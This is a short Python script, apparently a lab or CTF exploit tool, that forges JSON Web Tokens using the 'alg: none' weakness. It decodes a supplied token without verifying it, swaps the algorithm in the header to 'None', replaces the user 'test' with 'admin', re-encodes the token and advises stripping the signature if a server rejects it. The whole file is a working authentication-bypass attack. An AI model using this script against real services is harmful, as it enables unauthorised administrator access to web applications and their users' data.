import jwt, base64, sys
from colorama import Fore

#token
token = input("Enter token :::: ")
print(token)
#token1 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNzA5NzE1MDU0In0.M2QwN2EzMDkxODA1MmIxNDEyNjI5YjlhMTI1YmQ5ZGMxZDc0NjA0OTJkYmFiNzdkYTkzNWRhMjA2ZjYzNTkwZg"
payload = jwt.decode(token, options={"verify_signature": False})
print(f"decoded ::: {payload}\n")

##modified

### Generate Header
headers, payload, sig = token.split('.')
header_dec = base64.urlsafe_b64decode(headers + '=' *(len(headers) % 4))
header_mod = header_dec.replace(b'HS256',b'None')
print(f"Modified Header {header_mod.decode()}")
header_mod_64 = base64.urlsafe_b64encode(header_mod).rstrip(b"=").decode()

### Generate payload
payload_dec = base64.urlsafe_b64decode(payload + '=' * (len(payload) % 4))
modifed_payload = payload_dec.replace(b'test', b'admin')
print(f"Modified Payload {modifed_payload.decode()}")
modifed_payload_b64 = base64.urlsafe_b64encode(modifed_payload).rstrip(b"=").decode()

### Generate new token
modifed_token = f"{header_mod_64}.{modifed_payload_b64}.{sig}"
print(f"modifed token")
print(f"{modifed_token}")
print(f"Remove Signature if server reject your JWT")
